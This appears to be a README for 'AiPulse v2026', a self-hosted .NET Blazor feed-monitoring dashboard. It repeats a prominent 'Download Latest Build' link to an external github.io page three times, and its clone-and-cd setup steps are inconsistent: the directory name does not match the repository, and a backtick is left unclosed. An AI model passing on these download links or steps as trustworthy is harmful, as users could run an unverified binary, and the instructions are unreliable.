# AiPulse v2026 - self-hosted dashboard 2026

> AiPulse v2026 is a self-hosted dashboard built with .NET 8 and ASP.NET Core Blazor. It gives AI-focused developers one place to monitor RSS and Atom feeds, receive digests and alerts, and explore curated resources.

[![Platform](https://img.shields.io/badge/Platform-.NET%208%20%2F%20ASP.NET%20Core%20Blazor-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/lucas-stonepp6922/aipulse-ai-monitoring-hub?style=flat-square)](https://github.com/lucas-stonepp6922/aipulse-ai-monitoring-hub)

---

<p align="center">
  <a href="https://lucas-stonepp6922.github.io/aipulse-ai-monitoring-hub/">
    <img src="https://img.shields.io/badge/Download-AiPulse%20Latest-brightgreen?style=for-the-badge" alt="Download AiPulse">
  </a>
</p>

> **[Download AiPulse v2026](https://lucas-stonepp6922.github.io/aipulse-ai-monitoring-hub/)**

---

[Download Latest Build](https://lucas-stonepp6922.github.io/aipulse-ai-monitoring-hub/)

---

## What is AiPulse?

AiPulse brings feed monitoring, educational material, and operational notifications into a single self-hosted Blazor dashboard. It is intended for AI developers who need a straightforward way to follow RSS and Atom publishers, monitor emerging trends, and manage incoming information without switching between multiple applications.

Alongside live aggregation, the dashboard provides tools for discovering and organizing resources. Digests, full-text retrieval, OPML support, and role-based administration make it suitable for individual use as well as shared internal environments where teams need control over content and access.

---

## Core capabilities

- Continuously collect updates from RSS and Atom feeds
- Produce weekly digests for scheduled summaries
- Send desktop notifications for relevant alerts
- Import and export subscriptions through OPML
- Retrieve and scrape full article text for additional context
- Provide a learning hub and glossary for reference and onboarding
- Track useful services through a tools matrix and watchlist
- Support multiple user roles with administrator approval

---

## Getting started

Check out the repository and open the project in a .NET 8 development environment:

- `git clone https://github.com/lucas-stonepp6922/aipulse-ai-monitoring-hub.git
- `cd aipulse-blazor-hub-2026`

Restore the project dependencies, then run the application using your normal .NET workflow. Alternatively, download the published build from the link above and start the site or server package in the hosting environment you plan to use.

---

## Using the dashboard

Once the application is running, log in with an account assigned the appropriate workspace role. You can then register RSS and Atom feeds, move subscriptions in or out with OPML, inspect the watchlist, and use the learning hub to look up relevant tools and terminology.

A common operating sequence is:

- Bring in current subscriptions through OPML
- Add feeds or refresh existing sources
- Check digests and trending analytics
- Use desktop notifications for significant changes
- Handle users and approval decisions in the administration area

---

## Configuration

Keep deployment-specific options in the application's configuration files and hosting settings. Depending on the environment, these settings can cover connections, notification behavior, feed sources, and role-based access.

Example layout:

    {
      "App": {
        "Name": "AiPulse",
        "DigestSchedule": "Weekly",
        "NotificationsEnabled": true
      }
    }

Modify the values to reflect your hosting arrangement and your team's preferred behavior for feeds, alerts, and permissions.

---

## System requirements

- .NET 8 runtime or SDK
- ASP.NET Core hosting support
- A web browser that supports Blazor applications
- Storage for feeds, generated digests, and user preferences
- Network connectivity to RSS, Atom, and scraped content sources

---

## Frequently asked questions

**What is the quickest way to begin?**  
Clone the repository or download the latest build, then run AiPulse in an environment that supports .NET 8 hosting.

**Can existing feed subscriptions be brought into AiPulse?**  
Yes. The dashboard supports both OPML import and OPML export, allowing feed lists to be transferred into or out of the system.

**Where do digests and alerts appear?**  
Feed review, digest creation, notification handling, and watchlist activity are managed within the dashboard.

**How are application settings changed?**  
Edit the application's configuration files or the settings used by your deployment. The exact location depends on whether the instance runs locally or on a server.

**What should I check when content or features are not behaving correctly?**  
Confirm that the .NET 8 installation is correctly configured, check feed URLs and network connectivity, and inspect administrative and role permissions when expected content is missing.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
